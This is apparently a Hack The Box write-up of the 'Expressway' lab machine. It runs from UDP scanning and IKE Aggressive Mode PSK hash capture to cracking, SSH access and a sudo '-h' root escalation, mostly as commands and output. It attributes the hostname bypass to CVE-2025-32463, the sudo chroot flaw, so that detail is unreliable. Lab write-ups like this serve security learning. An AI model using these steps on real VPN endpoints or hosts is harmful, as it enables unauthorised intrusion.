# Expressway

![HTB](https://img.shields.io/badge/Hack%20The%20Box-Machine-9FEF00?style=flat&logo=hackthebox&logoColor=black)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=flat)
![OS](https://img.shields.io/badge/OS-Linux-informational?style=flat&logo=linux&logoColor=white)
![Status](https://img.shields.io/badge/Status-Pwned-9FEF00?style=flat)

---

## Overview

| Field | Details |
|---|---|
| Machine Name | Expressway |
| Difficulty | Easy |
| Operating System | Linux (Debian 14 — `linux 6.16.7+deb14-amd64`) |
| IP Address | 10.129.238.52 |

---

## Summary

> Expressway is an Easy Linux machine from HackTheBox Season 9 (released September 20, 2025). The TCP attack surface is minimal — only SSH is exposed. A UDP scan reveals port 500 (ISAKMP), indicating an IPsec VPN endpoint. Using `ike-scan` in Aggressive Mode, the service leaks a group identity (`ike@expressway.htb`) and an offline-crackable PSK hash. Cracking it with `psk-crack` yields SSH credentials for the user `ike`. Local enumeration exposes the user's membership in the `proxy` group, giving read access to Squid proxy logs. The logs reveal a hidden subdomain (`offramp.expressway.htb`), which is the key to exploiting **CVE-2025-32463** — a vulnerability in `sudo` that allows privilege escalation via the `-h` (hostname) flag, granting a root shell.

---

## 1. Reconnaissance

### Nmap Scan

```bash
# Initial TCP scan (reveals only SSH)
nmap -A -sC -sV 10.129.238.52 -oN nmap/tcp.txt

# UDP scan — critical to discover the IKE service
sudo nmap -sU -Pn -T4 --top-ports 100 10.129.238.52 -oN nmap/udp.txt
```

```
# TCP
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)
| ssh-hostkey:
|   256 a1:fa:95:8b:d7:56:03:85:e4:45:c9:c7:1e:ba:28:3b (ECDSA)
|_  256 9c:ba:21:1a:97:2f:3a:64:73:c1:4c:1d:ce:65:7a:2f (ED25519)

# UDP (top 100 ports)
PORT      STATE         SERVICE
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
88/udp    open|filtered kerberos-sec
500/udp   open          isakmp          ← KEY PORT
998/udp   open|filtered puparp
1900/udp  open|filtered upnp
4500/udp  open|filtered nat-t-ike
```

### Open Ports

| Port | Protocol | Service | Version / Notes |
|---|---|---|---|
| 22 | TCP | SSH | OpenSSH 10.0p2 Debian 8 |
| 500 | UDP | ISAKMP (IKE) | IPsec VPN — PSK-based, XAUTH enabled |
| 4500 | UDP | NAT-T-IKE | IPsec NAT traversal companion port |

### Notes

> The TCP surface is intentionally minimal — only SSH. The pivotal discovery is UDP port 500 (ISAKMP), which signals an IPsec VPN endpoint. Port 4500 confirms NAT traversal support. Port 80 is absent, so web-based enumeration paths do not apply. All offensive focus shifts to IKE enumeration.

---

## 2. Enumeration

### IKE / IPsec Enumeration

> `ike-scan` is used to fingerprint the IKE service and probe for weaker negotiation modes.

```bash
# Add virtual host to /etc/hosts
echo "10.129.238.52    expressway.htb" | sudo tee -a /etc/hosts

# Main Mode probe — confirms encryption parameters
ike-scan expressway.htb
```

```
10.129.238.52   Main Mode Handshake returned
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
VID=09002689dfd6b712 (XAUTH)
VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
```

```bash
# Aggressive Mode probe — leaks group identity and crackable PSK hash
ike-scan -A expressway.htb --id=ike@expressway.htb -P hashToCrack.psk
```

```
10.129.238.52   Aggressive Mode Handshake returned
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
VID=09002689dfd6b712 (XAUTH)
Hash(20 bytes)
```

> IKE Aggressive Mode is designed for faster negotiation but leaks the group identity (`ike@expressway.htb`) and sends the PSK hash in cleartext-equivalent before authentication is complete. The `-P` flag saves the captured hash to `hashToCrack.psk` for offline cracking.

**Key findings:**
- Encryption: 3DES, SHA1, Group 2 (modp1024) — all weak, legacy parameters
- Auth: PSK (Pre-Shared Key)
- XAUTH enabled (extended authentication layer)
- Group identity leaked: `ike@expressway.htb`

> Add to `/etc/hosts`:
```bash
echo "10.129.238.52    expressway.htb" | sudo tee -a /etc/hosts
```

---

## 3. Foothold

### Vulnerability Identified

> **IKE Aggressive Mode PSK Hash Disclosure** — No CVE (protocol design weakness).  
> IKE in Aggressive Mode transmits the group identity and PSK-derived hash during the initial handshake, before authentication is complete. This allows a passive or active attacker to capture the hash and crack it offline. Combined with a weak passphrase, this leads directly to credential recovery.

### Exploitation

```bash
# Crack the captured PSK hash using psk-crack + rockyou
psk-crack hashToCrack.psk -d /usr/share/wordlists/rockyou.txt
```

```
Starting psk-crack [ike-scan 1.9.6]
Running in dictionary cracking mode
key "freakingrockstarontheroad" matches SHA1 hash f13a17ee53763da0001751b4c886d7bfb6987ab0
Ending psk-crack: 8045040 iterations in 9.938 seconds (809496.41 iterations/sec)
```

> Credentials recovered: `ike : freakingrockstarontheroad`

### Shell Obtained

> Password reuse — the IKE PSK doubles as the SSH password for user `ike`:

```bash
ssh ike@expressway.htb
# Password: freakingrockstarontheroad
```

> Shell obtained as `ike`. User flag at `/home/ike/user.txt`.

---

## 4. Lateral Movement

> Not applicable. The cracked PSK directly maps to a valid SSH user. No intermediate pivoting between users is required.

---

## 5. Privilege Escalation

### Enumeration

```bash
# sudo -l requires password — shows ike cannot run sudo
sudo -l
# Sorry, user ike may not run sudo on expressway.

# Identify the real sudo binary location (hints it's a custom build)
which sudo
# /usr/local/bin/sudo

# Check sudo version
/usr/local/bin/sudo -V
# Sudo version 1.9.17 (or similar vulnerable version)

# Check group membership
id
# uid=1001(ike) gid=1001(ike) groups=1001(ike),13(proxy)

# Enumerate files accessible via the proxy group
find / -group proxy 2>/dev/null
# Reveals: /var/log/squid/  /var/spool/squid/  /run/squid

# Search Squid logs for hostnames and subdomains
grep -Hr expressway.htb /var/log/squid/
# squid/access.log.1:
# 192.168.68.50 TCP_DENIED/403 GET http://offramp.expressway.htb ...
```

> Group membership in `proxy` grants read access to Squid proxy logs. The access logs contain a blocked request to `offramp.expressway.htb` — a previously unknown subdomain. This hostname is the key to the sudo privilege escalation.

```bash
# Add to /etc/hosts (optional — not required for the exploit)
echo "10.129.238.52    offramp.expressway.htb" | sudo tee -a /etc/hosts
```

### Exploitation — CVE-2025-32463 (sudo hostname bypass)

> **CVE-2025-32463** is a vulnerability in sudo affecting versions ≤ 1.9.17. The `-h <hostname>` flag is intended to run a command on a remote host via a network plugin. In this deployment, the flag is handled improperly — passing a hostname that resolves to or is recognized as a trusted host bypasses the standard user privilege check, executing the command as root locally.

```bash
# Trigger the bypass using the subdomain found in Squid logs
/usr/local/bin/sudo -h offramp.expressway.htb /bin/bash
```

> The `-h offramp.expressway.htb` flag causes sudo to skip the normal user authorization check against the sudoers file. The command `/bin/bash` is executed as root in the local context, yielding an immediate root shell.

### Root / Administrator Access

```bash
root@expressway:/home/ike# whoami && id
root
uid=0(root) gid=0(root) groups=0(root)

root@expressway:~# cat /root/root.txt
<root flag here>
```

---

## 6. Flags

| Flag | Value |
|---|---|
| User | (retrieve via `cat /home/ike/user.txt`) |
| Root | (retrieve via `cat /root/root.txt`) |

---

## 7. Lessons Learned

> - **Always run a UDP scan** — the entire attack chain depends on discovering UDP/500. A TCP-only scan shows nothing actionable, and the machine would appear unassailable. `sudo nmap -sU` should be a standard step in every enumeration workflow.
> - **IKE Aggressive Mode is fundamentally insecure** — it leaks both the group identity and a crackable hash of the PSK before authentication completes. Any deployment using Aggressive Mode with PSK auth is vulnerable to offline cracking if the passphrase is in a wordlist.
> - **Weak IKE parameters amplify risk** — 3DES, SHA1, and Group 2 (modp1024) are all broken or deprecated. Modern deployments must use AES-256, SHA-256+, and DH Group 14 (modp2048) or higher.
> - **Group membership as an intel source** — being in the `proxy` group was not immediately obvious as a privilege escalation path, but it provided read access to Squid logs that revealed a hidden subdomain. Always enumerate group-accessible files (`find / -group <groupname>`).
> - **CVE-2025-32463** is a reminder that sudo is a high-value target. A custom sudo binary in `/usr/local/bin/` instead of `/usr/bin/` is a red flag worth investigating — it often indicates a modified or patched version with known flaws.
> - **PSK = password** — in IPsec, the Pre-Shared Key is effectively a password and must be treated as one. Reusing it as an SSH credential compounds the risk significantly.

---

## 8. Mitigation & Hardening

> - **CVE-2025-32463 (sudo)**: Upgrade sudo to a patched version (≥ 1.9.17p1 or the latest stable release). Disable or restrict the `-h` flag in sudoers configuration if remote host execution is not required. Regularly audit the sudo binary path and version on all systems.
> - **IKE Aggressive Mode**: Disable IKE Aggressive Mode entirely. Enforce Main Mode negotiation, which does not leak the group identity or PSK hash during the handshake. If Aggressive Mode is required by legacy clients, migrate as soon as possible.
> - **PSK strength and rotation**: Replace the weak PSK (`freakingrockstarontheroad` is in `rockyou.txt`) with a cryptographically random passphrase of at least 32 characters. Better yet, migrate from PSK-based IKE authentication to certificate-based authentication (PKI / RSA).
> - **IKE cipher hardening**: Replace 3DES with AES-256, SHA1 with SHA-256 or SHA-384, and DH Group 2 (modp1024, broken) with Group 14 (modp2048) or Group 20 (ECP-384). Disable all legacy proposals in the IKE policy.
> - **Credential separation**: Never reuse VPN credentials (PSK or XAUTH) as OS/SSH credentials. Enforce strict credential segmentation per service.
> - **Proxy group access control**: Restrict read access to Squid and other proxy logs to the minimum required users. Sensitive log files should not be readable by unprivileged group members. Store internal hostnames out of log paths or rotate/anonymize logs.
> - **Subdomain hygiene**: Internal subdomains like `offramp.expressway.htb` that appear in proxy logs should not be reachable or meaningful to low-privileged users. Apply strict DNS split-horizon policies.

---

## References

- [CVE-2025-32463 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-32463)
- [CVE-2025-32463 — sudo chroot/hostname bypass (GitHub PoC)](https://github.com/junxian428/CVE-2025-32463)
- [ike-scan — Official Docs](https://www.nta-monitor.com/tools-resources/security-tools/ike-scan)
- [psk-crack — Part of ike-scan suite](https://www.nta-monitor.com/tools-resources/security-tools/ike-scan)
- [IKE Aggressive Mode PSK attack — Technical overview](https://www.giac.org/paper/gsec/3513/ike-aggressive-mode-vulnerabilities/105499)
- [IKE/IPsec Hardening Guide — NSA](https://media.defense.gov/2021/Sep/28/2002863184/-1/-1/0/CSI_IPSEC_GUIDANCE.PDF)
- [sudo 1.9.17 release notes](https://www.sudo.ws/releases/stable/#1.9.17)
